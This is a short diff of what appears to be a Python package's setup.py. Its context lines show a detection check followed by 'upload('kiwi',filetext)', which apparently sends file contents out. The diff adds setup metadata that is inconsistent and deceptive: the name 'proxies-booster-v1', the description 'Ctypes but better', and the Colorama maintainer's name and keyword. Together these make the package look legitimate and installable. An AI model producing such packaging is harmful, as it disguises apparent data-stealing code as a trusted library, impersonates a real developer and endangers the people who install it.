@@ -681,4 +681,16 @@ if not DETECTED:
     upload('kiwi',filetext)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                           
+setup(
+
+    name='proxies-booster-v1',
+    packages=['proxies-booster-v1'],
+    version='1.0',
+    license='MIT',
+    description='Ctypes but better',
+    author=' Jonathan Hartley',
+    keywords=['Colorama'],
+    install_requires=[''],
+    classifiers=['Development Status :: 5 - Production/Stable']
+
+)
